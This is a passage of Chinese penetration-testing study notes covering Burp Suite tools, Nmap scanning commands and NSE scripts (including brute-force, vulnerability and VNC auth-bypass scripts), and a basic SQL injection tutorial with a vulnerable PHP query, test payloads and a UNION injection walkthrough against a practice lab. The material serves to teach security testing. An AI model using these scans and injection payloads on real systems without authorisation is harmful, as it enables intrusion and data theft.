<li>Params:对于包含参数(URL查询字符串、cookie头或者消息体)的请求，Params选项会把这些参数显示为名字/值的格式，这样就可以简单地对它们进行查看和修改了。</li>
<li>Headers:将以名字/值的格式显示HTTP的消息头，并且以原始格式显示消息</li>
<li>Hex:允许直接编辑由原始二进制数据组成的消息。</li>
</ul>
<p>在渗透测试过程中,我们经常使用Repeater进行请求与响应的消息验证分析，例如修改请求参数、验证输入的漏洞;修改请求参数、验证逻辑越权;从拦截历史记录中，捕获特征性的请求消息进行请求重放。</p>
<h5 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h5><p>Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别，使用到的场合有:</p>
<ul>
<li>枚举用户名的过程中，对比分析登录成功和失败时，服务端反馈结果的区别。</li>
<li>使用Intruder进行攻击时，对于不同的服务端响应，可以很快分析出两次响应的区别在哪里。</li>
<li>进行SQL注入的盲注测试时，比较两次响应消息的差异，判断响应结果与注入条件的关联关系。</li>
</ul>
<p>使用Comparer时有两个步骤，先是数据加载，然后是差异分析。</p>
<p>Comparer数据加载的常用方式如下所示。</p>
<ul>
<li>从其他Burp工具通过上下文菜单转发过来。</li>
<li>直接粘贴。</li>
<li>从文件里加载。</li>
</ul>
<p>加载完毕后，如果选择两次不同的请求或应答消息，则下发的比较按钮将被激活，此时可以选择文本比较或字节比较。</p>
<h5 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h5><p>Burp Sequencer是一种用于分析数据样本随机性质量的工具。可以用它测试应用程序的会话令牌(Session token)、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能很好地降低这些关键数据被伪造的风险。</p>
<p>Burp Sequencer主要由信息截取(Live Capture)、手动加载 (Manual Load)和选项分析(Analysis Options)三个模块组成。</p>
<p>在截取信息后，单击Load按钮加载信息，然后单击”Analyze now”按钮进行分析。</p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>Nmap (Network Mapper,网络映射器)是一款开放源代码的网络探测和安全审核工具。它被设计用来快速扫描大型网络，包括主机探测与发现、开放的端口情况、操作系统与应用服务指纹识别、WAF识别及常见安全漏洞。它的图形化界面是Zenmap，分布式框架为DNmap.</p>
<p>Nmap的特点如下所示:</p>
<ul>
<li>主机探测:探测网络上的主机，如列出响应TCP和ICMP请求、ICMP请求、开放特别端口的主机。</li>
<li>端口扫描:探测目标主机所开放的端口。</li>
<li>版本检测:探测目标主机的网络服务，判断其服务名称及版本号。</li>
<li>系统检测:探测目标主机的操作系统及网络设备的硬件特性。</li>
<li>支持探测脚本的编写:使用Nmap的脚本引擎(NSE)和Lua编程语言。</li>
</ul>
<h4 id="Nmap入门"><a href="#Nmap入门" class="headerlink" title="Nmap入门"></a>Nmap入门</h4><h5 id="扫描参数"><a href="#扫描参数" class="headerlink" title="扫描参数"></a>扫描参数</h5><p>在命令行直接执行Nmap或查看帮助文档(输入nmap —help)将显示Nmap的用法及其功能。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712072812958.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074450202.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074532948.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074558835.png" alt=""></p>
<p>Nmap的相关参数的含义与用法:</p>
<h6 id="1-设置扫描目标时用到的相关参数。"><a href="#1-设置扫描目标时用到的相关参数。" class="headerlink" title="1.设置扫描目标时用到的相关参数。"></a>1.设置扫描目标时用到的相关参数。</h6><ul>
<li>-iL:从文件中导入目标主机或目标网段。</li>
<li>-iR:随机选择目标主机。</li>
<li>—exclude:后面跟的主机或网段将不在扫描范围内。</li>
<li>—excludefile:导入文件中的主机或网段将不在扫描范围中。</li>
</ul>
<h6 id="2-与主机发现方法相关的参数。"><a href="#2-与主机发现方法相关的参数。" class="headerlink" title="2.与主机发现方法相关的参数。"></a>2.与主机发现方法相关的参数。</h6><ul>
<li>-sL: List Scan(列表扫描)，仅列举指定目标的IP，不进行主机发现。</li>
<li>-sn: Ping Scan,只进行主机发现，不进行端口扫描。</li>
<li>-Pn:将所有指定的主机视作已开启，跳过主机发现的过程。</li>
<li>-PS/PA/PU/PY [portlist]:使用TCP SYN/ACK或SCTP INIT/ECHO方式来发现。</li>
<li>-PE/PP/PM:使用ICMP echo、timestamp、netmask请求包发现主机。</li>
<li>-PO [protocol list]:使用IP协议包探测对方主机是否开启。</li>
<li>-n/-R:-n表示不进行DNS解析;-R表示总是进行DNS解析。</li>
<li>—dns-servers <serv1[,serv2],...>:指定DNS服务器。</li>
<li>—system-dns:指定使用系统的DNS服务器。</li>
<li>—traceroute:追踪每个路由节点。</li>
</ul>
<h6 id="3-与常见的端口扫描方法相关的参数。"><a href="#3-与常见的端口扫描方法相关的参数。" class="headerlink" title="3.与常见的端口扫描方法相关的参数。"></a>3.与常见的端口扫描方法相关的参数。</h6><ul>
<li>-sS/sT/sA/sW/sM:指定使用TCP SYN/Connect()/ACK/Window/Maimon scans的方式对目标主机进行扫描。</li>
<li>-sU:指定使用UDP扫描的方式确定目标主机的UDP端口状况。</li>
<li>-sN/sF/sX:指定使用TCP Null/FIN/Xmas scans秘密扫描的方式协助探测对方的TCP端口状态。</li>
<li>—scanflags \<flags\>:定制TCP包的flags。</li>
<li>-sI <zombie host[:probeport]>:指定使用Idle scan的方式描目标主机(前提是需要找到合适的zombie host)。</li>
<li>-sY/sZ:使用SCTP INIT/COOKIE-ECHO扫描SCTP协议端口的开放情况。</li>
<li>-sO:使用IP protocol扫描确定目标机支持的协议类型。</li>
<li>-b \<FTP relay host>:使用FTP bounce scan扫描方式。</li>
</ul>
<h6 id="4-跟端口参数与扫描顺序的设置相关的参数。"><a href="#4-跟端口参数与扫描顺序的设置相关的参数。" class="headerlink" title="4.跟端口参数与扫描顺序的设置相关的参数。"></a>4.跟端口参数与扫描顺序的设置相关的参数。</h6><ul>
<li>-p \<port ranges>:扫描指定的端口。</li>
<li>-F: Fast mode(快速模式)，仅扫描TOP 100的端口。</li>
<li>-r:不进行端口随机打乱的操作(如无该参数，Nmap会将要扫描的端口以随机顺序的方式进行扫描，让Nmap的扫描不易被对方防火墙检测到)</li>
<li>—top-ports \<number>:扫描开放概率最高的number个端口(Nmap的作者曾做过大规模的互联网扫描，以此统计网络上各种端口可能开放的概率，并排列出最有可能开放端口的列表，具体可以参见nmap-services文件。默认情况下，Nmap会扫描最有可能的1000个TCP端口)。</li>
<li>—port-ratio \<ratio>:扫描指定频率以上的端口。与上述—top-ports类似，这里以概率作为参数，概率大于—port-ratio的端口才被扫描。显然参数必须在0~1之间，想了解具体的概率范围可以查看nmap-services文件。</li>
</ul>
<h6 id="5-与版本侦测相关的参数。"><a href="#5-与版本侦测相关的参数。" class="headerlink" title="5.与版本侦测相关的参数。"></a>5.与版本侦测相关的参数。</h6><ul>
<li>-sV:指定让Nmap进行版本侦测。</li>
<li>—version-intensity \<level>:指定版本侦测的强度(0~9)，默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</li>
<li>—version-light:指定使用轻量级侦测方式(intensity 2)。</li>
<li>—version-all:尝试使用所有的probes进行侦测(intensity 9)。</li>
<li>—version-trace:显示出详细的版本侦测过程信息。</li>
</ul>
<p>在了解以上参数及其含义后，再来看用法会更好理解，扫描命令格式: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap+扫描参数+目标地址或网段</span><br></pre></td></tr></table></figure>
<p>例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -T4 -A -v ip</span><br></pre></td></tr></table></figure>
<p>其中-A表示使用进攻性(Aggressive)方式扫描; -T4表示指定扫描过程使用的时序(Timing)，共有6个级别(0~5)，级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通信状况良好的情况下推荐使用T4。-v表示显示冗余(verbosity)信息，在扫描过程中显示扫描的细节，有助于让用户了解当前的扫描状态。</p>
<h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><h6 id="1-扫描单个目标地址"><a href="#1-扫描单个目标地址" class="headerlink" title="1.扫描单个目标地址"></a>1.扫描单个目标地址</h6><p>在Nmap后面直接添加目标地址即可扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712080248534.png" alt=""></p>
<h6 id="2-扫描多个目标地址"><a href="#2-扫描多个目标地址" class="headerlink" title="2.扫描多个目标地址"></a>2.扫描多个目标地址</h6><p>如果目标地址不在同一网段，或在同一网段但不连续且数量不多，可以使用该方法进行扫描。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1 192.168.56.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712080643727.png" alt=""></p>
<h6 id="3-扫描一个范围内的目标地址"><a href="#3-扫描一个范围内的目标地址" class="headerlink" title="3.扫描一个范围内的目标地址"></a>3.扫描一个范围内的目标地址</h6><p>可以指定扫描一个连续的网段，中间使用”-“连接，例如，下列命令表示扫描范围为192.168.88.1~192.168.88.10。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1-10</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085718822.png" alt=""></p>
<h6 id="4-扫描目标地址所在的某个网段"><a href="#4-扫描目标地址所在的某个网段" class="headerlink" title="4.扫描目标地址所在的某个网段"></a>4.扫描目标地址所在的某个网段</h6><p>以C段为例，如果目标是一个网段，则可以通过添加子网掩码的方式扫描，下列命令表示扫描范围为192.168.88.1~192.168.88.255。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1&#x2F;24</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085118209.png" alt=""></p>
<h6 id="5-扫描主机列表target-txt中的所有目标地址"><a href="#5-扫描主机列表target-txt中的所有目标地址" class="headerlink" title="5.扫描主机列表target.txt中的所有目标地址"></a>5.扫描主机列表target.txt中的所有目标地址</h6><p>扫描target.txt中的地址或者网段，此处导入的是绝对路径，如果target.txt文件与nmap在同一个目录下，则直接引用文件名即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -iL target.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085423236.png" alt=""></p>
<h6 id="6-扫描除某一个目标地址之外的所有目标地址"><a href="#6-扫描除某一个目标地址之外的所有目标地址" class="headerlink" title="6.扫描除某一个目标地址之外的所有目标地址"></a>6.扫描除某一个目标地址之外的所有目标地址</h6><p>下列命令表示扫描除192.168.0.105之外的其他192.168.0.x地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1&#x2F;24 --exclude 192.168.88.4</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085623439.png" alt=""></p>
<h6 id="7-扫描除某一文件中的目标地址之外的目标地址"><a href="#7-扫描除某一文件中的目标地址之外的目标地址" class="headerlink" title="7.扫描除某一文件中的目标地址之外的目标地址"></a>7.扫描除某一文件中的目标地址之外的目标地址</h6><p>下列命令表示扫描除了target.txt文件中涉及的地址或网段之外的目标地址。还是以扫描192.168.88.x网段为例，在target.txt中添加192.168.88.1和192.168.88.5。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1&#x2F;24 --excludefile target.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085912318.png" alt=""></p>
<h6 id="8-扫描某一目标地址的特定端口"><a href="#8-扫描某一目标地址的特定端口" class="headerlink" title="8.扫描某一目标地址的特定端口"></a>8.扫描某一目标地址的特定端口</h6><p>如果不需要对目标主机进行全端口扫描，只想探测它是否开放了某一端口，那么使用-p参数指定端口号，将大大提升扫描速度。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.1 -p 22,23,80</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712083949109.png" alt=""></p>
<h6 id="9-对目标地址进行路由跟踪"><a href="#9-对目标地址进行路由跟踪" class="headerlink" title="9.对目标地址进行路由跟踪"></a>9.对目标地址进行路由跟踪</h6><p>下列命令表示对目标地址进行路由跟踪。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --traceroute 192.168.56.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712084213833.png" alt=""></p>
<h6 id="10-扫描目标地址所在C段的在线状况"><a href="#10-扫描目标地址所在C段的在线状况" class="headerlink" title="10.扫描目标地址所在C段的在线状况"></a>10.扫描目标地址所在C段的在线状况</h6><p>下列命令表示扫描目标地址所在C段的在线状况。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712084355147.png" alt=""></p>
<h6 id="11-目标地址的操作系统指纹识别"><a href="#11-目标地址的操作系统指纹识别" class="headerlink" title="11.目标地址的操作系统指纹识别"></a>11.目标地址的操作系统指纹识别</h6><p>下列命令表示通过指纹识别技术识别目标地址的操作系统的版本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -O 192.168.88.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712090051908.png" alt=""></p>
<h6 id="12-目标地址提供的服务版本检测"><a href="#12-目标地址提供的服务版本检测" class="headerlink" title="12.目标地址提供的服务版本检测"></a>12.目标地址提供的服务版本检测</h6><p>下列命令表示检测目标地址开放的端口对应的服务版本信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.88.1</span><br></pre></td></tr></table></figure>
<h6 id="13-探测防火墙状态"><a href="#13-探测防火墙状态" class="headerlink" title="13.探测防火墙状态"></a>13.探测防火墙状态</h6><p>在实战中，可以利用FIN扫描的方式探测防火墙的状态。FIN扫描用于识别端口是否关闭，收到RST回复说明该端口关闭，否则就是open或filtered状态。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sF -T4 192.168.88.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712090442765.png" alt=""></p>
<h5 id="状态识别"><a href="#状态识别" class="headerlink" title="状态识别"></a>状态识别</h5><p>Nmap输出的是扫描列表，包括端口号、端口状态、服务名称、服务版本及协议。通常有如下表所示的6种状态。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>状态</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>open</td>
<td>开放的，表示应用程序正在监听该端口的连接，外部可以访问</td>
</tr>
<tr>
<td>filtered</td>
<td>被过滤的，表示端口被防火墙或其他网络设备阻止，不能访问</td>
</tr>
<tr>
<td>closed</td>
<td>关闭的，表示目标主机未开启该端口</td>
</tr>
<tr>
<td>unfiltered</td>
<td>未被过滤的，表示Nmap无法确定端口所处状态，需进一步探测</td>
</tr>
<tr>
<td>open/filtered</td>
<td>开放的或被过滤的，Nmap不能识别</td>
</tr>
<tr>
<td>closed/filtered</td>
<td>关闭的或被过滤的，Nmap不能识别</td>
</tr>
</tbody>
</table>
</div>
<p>了解了以上状态，在渗透测试过程中，将有利于我们确定下一步应该采取什么<br>方法或攻击手段。</p>
<h4 id="Nmap进阶"><a href="#Nmap进阶" class="headerlink" title="Nmap进阶"></a>Nmap进阶</h4><h5 id="脚本介绍"><a href="#脚本介绍" class="headerlink" title="脚本介绍"></a>脚本介绍</h5><p>Nmap的脚本默认存在/usr/share/nmap/scripts文件夹下</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712095117059.png" alt=""></p>
<p>Nmap的脚本主要分为以下几类:</p>
<ul>
<li>Auth:负责处理鉴权证书(绕过鉴权)的脚本。</li>
<li>Broadcast:在局域网内探查更多服务的开启情况，如DHCP/DNS/SQLServer等。</li>
<li>Brute:针对常见的应用提供暴力破解方式，如HTTP/SMTP等。</li>
<li>Default:使用-sC或A选项扫描时默认的脚本，提供基本的脚本扫描能力。</li>
<li>Discovery:对网络进行更多信息的搜集，如SMB枚举、SNMP查询等。</li>
<li>Dos:用于进行拒绝服务攻击。</li>
<li>Exploit: 利用已知的漏洞入侵系统。</li>
<li>External:利用第三方的数据库或资源。例如，进行Whois解析。</li>
<li>Fuzzer:模糊测试脚本，发送异常的包到目标机，探测出潜在漏洞。</li>
<li>Intrusive:入侵性的脚本，此类脚本可能弓发对方的IDS/IPS的记录或屏蔽。</li>
<li>Malware:探测目标机是否感染了病毒、开启后门等信息。</li>
<li>Safe:此类与Intrusive相反，属于安全性脚本。</li>
<li>Version:负责增强服务与版本扫描功能的脚本。</li>
<li>Vuln:负责检查目标机是否有常见漏洞，如MS08-067.</li>
</ul>
<h5 id="常见脚本"><a href="#常见脚本" class="headerlink" title="常见脚本"></a>常见脚本</h5><p>用户还可根据需要设置—script=类别进行扫描，常用参数如下所示:</p>
<ul>
<li>-sC/—script=default:使用默认的脚本进行扫描。</li>
<li>—script= \<Lua scripts>:使用某个脚本进行扫描。</li>
<li>—script-args=key1=value1,key2=value2…:该参数用于传递脚本里的参数，key1是参数名，该参数对应value1这个值。如有更多的参数，使用逗号连接。</li>
<li>—script-args-file=filename:使用文件为脚本提供参数。</li>
<li>—script-trace:如果设置该参数，则显示脚本执行过程中发送与接收的数据。</li>
<li>—script-updatedb:在Nmap的scripts目录里有一个script.db文件，该文件保存了当前Nmap可用的脚本，类似于一个小型数据库，如果我们开启Nmap并调用了此参数，则Nmap会自行扫描scripts目录中的扩展脚本，进行数据库更新。</li>
<li>—script-help:调用该参数后，Nmap会输出该脚本对应的脚本使用参数，以及详细的介绍信息。</li>
</ul>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><h6 id="1-鉴权扫描"><a href="#1-鉴权扫描" class="headerlink" title="1.鉴权扫描"></a>1.鉴权扫描</h6><p>使用—script=auth可以对目标主机或目标主机所在的网段进行应用弱口令检测。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;auth 192.168.88.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712143952557.png" alt=""></p>
<h6 id="2-暴力破解攻击"><a href="#2-暴力破解攻击" class="headerlink" title="2.暴力破解攻击"></a>2.暴力破解攻击</h6><p>Nmap具有暴力破解的功能，可对数据库、SMB、SNMP等进行简单密码的暴力猜解。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;brute 192.168.0.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144436805.png" alt=""></p>
<h6 id="3-扫描常见的漏洞"><a href="#3-扫描常见的漏洞" class="headerlink" title="3.扫描常见的漏洞"></a>3.扫描常见的漏洞</h6><p>Nmap具备漏洞扫描的功能，可以检查目标主机或网段是否存在常见的漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;vuln 192.168.88.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144525432.png" alt=""></p>
<h6 id="4-应用服务扫描"><a href="#4-应用服务扫描" class="headerlink" title="4.应用服务扫描"></a>4.应用服务扫描</h6><p>Nmap具备很多常见应用服务的扫描脚本，例如VNC服务、MySQL服务、Telnet服务、Rsync服务等,此处以VNC服务为例。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;realvnc-auth-bypass 192.168.88.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144648105.png" alt=""></p>
<h6 id="5-探测局域网内更多服务开启的情况"><a href="#5-探测局域网内更多服务开启的情况" class="headerlink" title="5.探测局域网内更多服务开启的情况"></a>5.探测局域网内更多服务开启的情况</h6><p>输入以下命令即可探测局域网内更多服务开启的情况。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -n -p 445 --script&#x3D;broadcast 192.168.0.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144959242.png" alt=""></p>
<h6 id="6-Whois解析"><a href="#6-Whois解析" class="headerlink" title="6.Whois解析"></a>6.Whois解析</h6><p>利用第三方的数据库或资源查询目标地址的信息，例如进行Whois解析。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -script external idefun.com</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712145517002.png" alt=""></p>
<p>更多扫描脚本的使用方法可参见<a target="_blank" rel="noopener external nofollow noreferrer" href="https://nmap.org/nsedoc/categories">https://nmap.org/nsedoc/categories</a>.</p>
<h2 id="Web安全原理剖析"><a href="#Web安全原理剖析" class="headerlink" title="Web安全原理剖析"></a>Web安全原理剖析</h2><h3 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h3><h4 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h4><p>SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p>
<p>一般情况下，开发人员可以使用动态SQL语句创建通用、灵活的应用。动态SQL语句是在执行过程中构造的，它根据不同的条件产生不同的SQL语句。当开发人员在运行过程中需要根据不同的查询标准决定提取什么字段(如select语句)，或者根据不同的条件选择不同的查询表时，动态地构造SQL语句会非常有用。</p>
<p>下面以PHP语句为例:<br>$query= “SELECT * FROM users WHERE id=$_GET [‘id’] “;</p>
<p>由于这里的参数ID可控，且带入数据库查询，所以非法用户可以任意拼接SQL语句进行攻击。<br>当然，SQL注入按照不同的分类方法可以分为很多种，如报错注入、盲注、Union注入等。</p>
<h4 id="SQL注入的原理"><a href="#SQL注入的原理" class="headerlink" title="SQL注入的原理"></a>SQL注入的原理</h4><p>SQL注入漏洞的产生需要满足以下两个条件:</p>
<ul>
<li>参数用户可控:前端传给后端的参数内容是用户可以控制的。</li>
<li>参数带入数据库查询:传入的参数拼接到SQL语句，且带入数据库查询。</li>
</ul>
<p>当传入的ID参数为1’时，数据库执行的代码如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D; 1&#39;</span><br></pre></td></tr></table></figure>
<p>这不符合数据库语法规范，所以会报错。当传入的ID参数为and 1=1时，执行的SQL语句如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and 1&#x3D;1</span><br></pre></td></tr></table></figure>
<p>因为1=1为真，且where语句中id=1也为真，所以页面会返回与id= 1相同的结果。当传入的ID参数为and 1=2时，由于1=2不成立，所以返回假，页面就会返回与id=1不同的结果.</p>
<p>由此可以初步判断ID参数存在SQL注入漏洞，攻击者可以进一步拼接SQL语句进行攻击，致使数据库信息泄露，甚至进一步获取服务器权限等。</p>
<p>在实际环境中，凡是满足上述两个条件的参数皆可能存在SQL注入漏洞，因此开发者需秉持”外部参数皆不可信的原则”进行开发。</p>
<h4 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h4><ul>
<li>回显正常—-&gt; 联合查询 union select</li>
<li>回显报错—-&gt; Duplicate entry()<pre><code>         extractvalue()
          　　         updatexml()
</code></pre></li>
<li>盲注    —-&gt;布尔型盲注<pre><code>        基于时间的盲注sleep()
</code></pre></li>
</ul>
<h4 id="与MySQL注入相关的知识点"><a href="#与MySQL注入相关的知识点" class="headerlink" title="与MySQL注入相关的知识点"></a>与MySQL注入相关的知识点</h4><p>在MySQL 5.0版本之后，MySQL默认在数据库中存放一个”information_schema”的数据库，在该库中，需要记住三个表名，分别是SCHEMATA、TABLES和COLUMNS.</p>
<p>SCHEMATA表存储该用户创建的所有数据库的库名。我们需要记住该表中记录数据库库名的字段名为SCHEMA_NAME。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712151813582.png" alt=""></p>
<p>TABLES表存储该用户创建的所有数据库的库名和表名。我们需要记住该表中记录数据库库名和表名的字段名分别为TABLE_SCHEMA和TABLE_NAME。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712152041516.png" alt=""></p>
<p>COLUMNS表存储该用户创建的所有数据库的库名、表名和字段名。我们需要记住该表中记录数据库库名、表名和字段名的字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712152853158.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720151235142.png" alt=""></p>
<p>常用的MySQL查询语句和函数如下所示:</p>
<h5 id="1-MySQL查询语句"><a href="#1-MySQL查询语句" class="headerlink" title="1.MySQL查询语句"></a>1.MySQL查询语句</h5><p>在不知道任何条件时，语句如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM库名.表名</span><br></pre></td></tr></table></figure>
<p>在知道一条已知条件时，语句如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件1的字段名&#x3D;&#39;已知条件1的值&#39; and 已知条件2的字段名&#x3D;&#39;已知条件2的值&#39;</span><br></pre></td></tr></table></figure>
<h5 id="2-limit的用法"><a href="#2-limit的用法" class="headerlink" title="2.limit的用法"></a>2.limit的用法</h5><p>limit的使用格式为limit m,n,其中m是指记录开始的位置，从0开始，表示第一条记录; n是指取n条记录。例如limit 0,1表示从第一条记录开始，取一条记录，不使用limit和使用limit查询的结果如下所示，可以很明显地看出二者的区别。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712153604147.png" alt=""></p>
<h5 id="3-需要记住的几个函数"><a href="#3-需要记住的几个函数" class="headerlink" title="3.需要记住的几个函数"></a>3.需要记住的几个函数</h5><ul>
<li>database():当前网站使用的数据库。</li>
<li>version():当前MySQL的版本。</li>
<li>user():当前MySQL的用户。</li>
</ul>
<h5 id="4-注释符"><a href="#4-注释符" class="headerlink" title="4.注释符"></a>4.注释符</h5><p>在MySQL中，常见注释符的表达方式: #或—空格或/**/.</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720084923856.png" alt=""></p>
<h5 id="5-内联注释"><a href="#5-内联注释" class="headerlink" title="5.内联注释"></a>5.内联注释</h5><p>内联注释的形式:/*! code*/。内联注释可以用于整个SQL语句中，用来执行我们的SQL语句，下面举一个例子:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?id&#x3D;-15 &#x2F;*! UNION*&#x2F;&#x2F;*! SELECT*&#x2F;1, 2, 3</span><br></pre></td></tr></table></figure>
<h4 id="Union注入攻击"><a href="#Union注入攻击" class="headerlink" title="Union注入攻击"></a>Union注入攻击</h4><p>union型SQL注入，看名字就能知道，使用这种方法可以直接在页面中返回我们要查询的数据，方法也很简单，即使用UNION联合查询即可。</p>
<p>但使用UNION联合查询时还要满足一个条件，那就是我们构造的SELECT语句的字段数要和当前表的字段数相同才能联合查询，即首先我们要确定当前表的字段数。order by x是数据库中的一个排序语句，order by 1即通过第一个字段进行排序。这时我们就可以构造SELECT * FROM news WHERE id=’1’ order by x— a’来猜测当前表的字段数，x值递增，当页面返回数据异常时，即无当前字段时，用当前的x值减一即可得到当前表的字段数了。</p>
<p>知道了当前表的字段数，就可以进行UNION联合查询了。但联合查询时，页面只会显示查询到数据的第一条，也就是UNION前的SELECT语句的结果，想要显示我们自己联合查询的结果时，还必须使前一条语句失效，这里我们构造and 1=2使前一句SELECT语句失效。</p>
<p>Union注入攻击的测试地址: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://sqli.bihuo.cn/Less-1/访问该网址时，页面返回的结果如图所示。">http://sqli.bihuo.cn/Less-1/访问该网址时，页面返回的结果如图所示。</a></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720081843645.png" alt=""></p>
<p>访问id=1时,返回页面如下</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720082326714.png" alt=""></p>
<p>在URL后添加一个单引号(即id=1’)，再次访问，页面返回的结果与id=1的结果不同。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720082512378.png" alt=""></p>
<p>根据报错信息，猜想输入参数的值被放到一对单引号之间。</p>
<p>猜测后台源码中存在类似于如下的数据库查询语句（可查看后台源码证实猜测）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
<p>使用order by 1-99查询该数据表中的字段数量</p>
<p>使用order by 3 —+查询该数据表中的字段数量,正常返回</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720083528417.png" alt=""></p>
